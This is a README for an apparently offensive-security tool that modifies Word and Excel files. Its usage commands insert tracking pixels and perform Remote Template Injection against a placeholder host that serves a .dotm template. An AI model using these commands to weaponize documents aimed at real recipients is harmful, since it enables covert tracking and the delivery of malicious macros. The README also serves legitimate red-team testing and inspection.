# Doctrack
Tool to manipulate and weaponize Office Open XML documents.
## Features
* Insert tracking pixels into Office Open XML documents (Word, Excel)
* Inject template URL (aka Remote Template Injection)
* Insert CustomXML parts
* Inspect external target URLs, metadata and Custom XML parts
## Installation
You will need to download [.Net 6.0](https://dotnet.microsoft.com/download/). Then, to build a single binary on Windows:
```cmd
$ git clone https://github.com/wavvs/doctrack.git
$ cd doctrack/
$ dotnet publish -r win-x64 -c Release /p:PublishSingleFile=true
```
On Linux:
```bash
$ dotnet publish -r linux-x64 -c Release /p:PublishSingleFile=true
```
## Usage
```cmd
$ doctrack --help
Tool to manipulate and weaponize Office Open XML documents.

  -i, --input          Input filename.
  -o, --output         Output filename. If not set, document is saved as --input
                       file.
  -m, --metadata       Metadata to supply (JSON file).
  -u, --url            URL to insert.
  -e, --template       (Default: false) If set, enables template URL injection.
  -s, --inspect        (Default: false) Inspect document.
  -c, --custom-part    Insert a Custom XML part (XML file)
  --help               Display this help screen.
```
Insert a tracking pixel and change document metadata:
```cmd
$ doctrack -i test.docx -o test.docx --metadata metadata.json --url http://test.url/image.png
```
Insert a remote template URL (aka Remote Template Injection):
```cmd
$ doctrack -i test.docx -o test.docx --url http://test.url/template.dotm --template
```
Insert a Custom XML part:
```
$ doctrack -i test.docx -o test.docx -c part.xml
```
Inspect external target URLs, metadata and Custom XML parts:
```cmd
$ doctrack -i test.docx --inspect
[External targets]
Part: /word/document.xml, ID: R8783bc77406d476d, URI: http://test.url/image.png
Part: /word/settings.xml, ID: R33c36bdf400b44f6, URI: http://test.url/template.dotm

[Metadata]
Creator: wavvs
Title: doctrack
Subject:
Category:
Keywords:
Description: Tool to insert tracking pixels into Office Open XML documents.
ContentType:
ContentStatus:
Version:
Revision:
Created: 13.10.2020 23:20:39
Modified: 13.10.2020 23:20:39
LastModifiedBy:
LastPrinted: 13.10.2020 23:20:39
Language:
Identifier:

[CustomXML Parts]
Part: /customXML/item.xml (25 bytes)
```